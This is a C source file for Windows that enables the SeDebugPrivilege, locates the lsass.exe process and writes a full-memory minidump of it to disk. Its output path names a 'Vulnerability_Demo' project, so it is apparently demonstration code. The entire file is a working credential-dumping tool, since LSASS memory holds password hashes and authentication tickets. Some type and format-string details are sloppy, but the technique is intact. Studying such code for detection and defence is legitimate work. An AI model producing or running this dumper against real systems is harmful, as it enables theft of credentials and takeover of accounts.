#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <tlhelp32.h>
#include <dbghelp.h>

#pragma comment (lib, "dbghelp.lib")

// Find process ID by process name
int FindProcessId(const wchar_t* processName) {
    HANDLE snapshot;
    PROCESSENTRY32 processEntry;
    int processId = 0;
    BOOL result;

    // Create a snapshot of all processes in the system
    snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (INVALID_HANDLE_VALUE == snapshot) {
        printf("Failed to create snapshot of processes\n");
        return 0;
    }

    // Initialize the size: needed for using Process32First
    processEntry.dwSize = sizeof(PROCESSENTRY32);

    // Retrieve information about the first process encountered in a system snapshot
    result = Process32First(snapshot, &processEntry);
    if (!result) {
        printf("Failed to retrieve information about the first process\n");
        CloseHandle(snapshot);
        return 0;
    }

    // Retrieve information about the processes and exit if unsuccessful
    while (result) {
        // If the process name matches, return the process ID
        if (wcscmp(processName, processEntry.szExeFile) == 0) {
            processId = processEntry.th32ProcessID;
            break;
        }
        result = Process32Next(snapshot, &processEntry);
    }

    // Close the handle to the snapshot
    CloseHandle(snapshot);

    if (processId == 0) {
        printf("Failed to find process with name: %s\n", processName);
    }

    return processId;
}

// Set privilege
BOOL SetPrivilege(LPCTSTR privilege) {
    HANDLE token;
    TOKEN_PRIVILEGES tokenPrivileges;
    LUID luid;
    BOOL result = TRUE;

    // Lookup the LUID for the specified privilege
    if (!LookupPrivilegeValue(NULL, privilege, &luid))
        result = FALSE;

    // Enable the specified privilege
    tokenPrivileges.PrivilegeCount = 1;
    tokenPrivileges.Privileges[0].Luid = luid;
    tokenPrivileges.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

    // Open the process token
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &token))
        result = FALSE;

    // Adjust the token privileges
    if (!AdjustTokenPrivileges(token, FALSE, &tokenPrivileges, sizeof(TOKEN_PRIVILEGES), (PTOKEN_PRIVILEGES)NULL, (PDWORD)NULL))
        result = FALSE;

    // Print the result of enabling the privilege
    printf(result ? "Successfully enabled privilege: %s\n" : "Failed to enable privilege: %s\n", privilege);

    return result;
}

// Create a minidump of lsass.exe process
BOOL CreateLsassMinidump() {
    bool dumped = FALSE;
    int processId = FindProcessId(L"lsass.exe");
    HANDLE processHandle = OpenProcess(PROCESS_VM_READ | PROCESS_QUERY_INFORMATION, 0, processId);
    HANDLE dumpFileHandle = CreateFile(L"C:\\Users\\user\\source\\repos\\Vulnerability_Demo\\x64\\Debug\\lsass.dmp", GENERIC_ALL, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);

    // Check if opening the lsass.exe process succeeded
    if (processHandle == NULL || processHandle == INVALID_HANDLE_VALUE) {
        printf("Failed to open lsass.exe process. Error: %lu\n", GetLastError());
        return dumped;
    }

    // Check if creating the dump file succeeded
    if (dumpFileHandle == INVALID_HANDLE_VALUE) {
        printf("Failed to create dump file. Error: %lu\n", GetLastError());
        CloseHandle(processHandle);
        return dumped;
    }

    // Write the minidump of the lsass.exe process
    dumped = MiniDumpWriteDump(processHandle, processId, dumpFileHandle, (MINIDUMP_TYPE)0x00000002, NULL, NULL, NULL);
    if (dumped) {
        printf("Successfully created minidump of lsass.exe process\n");
    }
    else {
        printf("Failed to create minidump of lsass.exe process. Error: %lu\n", GetLastError());
    }

    // Close the handles
    CloseHandle(dumpFileHandle);
    CloseHandle(processHandle);

    return dumped;
}

int main(int argc, char* argv[]) {
    // Enable the SE_DEBUG_NAME privilege to access process information
    if (!SetPrivilege(SE_DEBUG_NAME)) {
        printf("Failed to enable SE_DEBUG_NAME privilege\n");
        return -1;
    }

    // Create a minidump of the lsass.exe process
    if (!CreateLsassMinidump()) {
        printf("Failed to create minidump of lsass.exe process\n");
        return -1;
    }

    return 0;
}
